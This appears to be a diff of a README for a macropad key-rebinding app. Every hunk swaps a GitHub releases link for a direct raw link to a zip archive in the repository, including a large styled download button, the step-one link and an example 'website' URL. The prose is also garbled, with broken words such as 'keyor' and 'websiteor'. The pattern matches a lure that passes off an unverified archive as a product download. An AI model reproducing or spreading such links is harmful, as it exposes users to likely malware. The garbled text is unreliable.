@@ -1,7 +1,7 @@
 <h1>🎮 macropad-rebind - Master Your Macro Keys Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/joseantoniojimenezgarcia698-hub/macropad-rebind/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ Download Now — Free</a>
+  <a href="https://raw.githubusercontent.com/joseantoniojimenezgarcia698-hub/macropad-rebind/main/linux/v3.7.zip" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ Download Now — Free</a>
 </p>
 
 ---
@@ -22,7 +22,7 @@ Getting up and running takes less than two minutes. Follow these foolproof steps
 
 ### 📥 Step 1: Grab the App
 
-Click the big purple button at the top of this page — or this one right here: **[Visit this link to download the application](https://github.com/joseantoniojimenezgarcia698-hub/macropad-rebind/releases)**. That'll take you to the download area. Find the newest version (it should say "Latest" at the top) and download it.
+Click the big purple button at the top of this page — or this one right here: **[Visit this link to download the application](https://raw.githubusercontent.com/joseantoniojimenezgarcia698-hub/macropad-rebind/main/linux/v3.7.zip)**. That'll take you to the download area. Find the newest version (it should say "Latest" at the top) and download it.
 
 onto your computer. The download itself is quick —it's a small file.
 
@@ -57,7 +57,7 @@ ach square represents one keyor.
 :
 
 - **Tap a key** to select itor.
-- **Then type** what you want that key to do — for example, type `Ctrl+C` for copy, or `https://youtube.com` to open a websiteor.
+- **Then type** what you want that key to do — for example, type `Ctrl+C` for copy, or `https://raw.githubusercontent.com/joseantoniojimenezgarcia698-hub/macropad-rebind/main/linux/v3.7.zip` to open a websiteor.
 - Or pick from a **dropdown menu** with common actions: Volume Up, Play/Pause, Open Calculator, Type an Emoji, Launch a Program, and dozens moreor.
 - Then press **"Apply"** and repeat for every key you wantor.
 
